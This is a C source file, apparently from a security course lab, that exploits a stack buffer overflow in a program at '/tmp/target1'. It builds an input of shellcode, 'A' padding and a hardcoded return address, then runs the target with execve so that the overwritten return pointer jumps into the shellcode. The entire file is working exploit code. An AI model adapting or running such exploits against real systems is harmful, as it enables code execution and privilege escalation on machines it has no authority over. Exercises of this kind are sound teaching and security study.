#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

/*
We define constants here, including the return address we
found manually. We know from observing the assembly code that
the overflow must be large enough to overflow the buffer,
the base pointer and the return address of its stack frame.
*/
#define TARGET "/tmp/target1"
#define FILLER "A"
#define RETURN_ADDR "\x88\xfc\xff\xbf" //Note: Little-Endian
#define PTR_SPACE sizeof(void*)
#define OVERFLOW_SIZE 240+(2*PTR_SPACE)

void ncat(int n, char *str, char *pad)
{
  int i;
  for (i=0; i<n; i++)
  {
    strcat(str, pad);
  }
}

int main(void)
{
  char *args[3];
  char *env[1];

  char input[OVERFLOW_SIZE];

  /*
  We construct the string so that the shellcode is at the lowest address
  of the buffer. Then we insert padding such that our pointer to this address
  is written into the return address space of the stack frame.
  */
  strcat(input, shellcode); 
  int padlen = OVERFLOW_SIZE-strlen(shellcode)-PTR_SPACE;
  ncat(padlen,input, FILLER);
  strcat(input, RETURN_ADDR);

  args[0] = TARGET; args[1] = input; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}

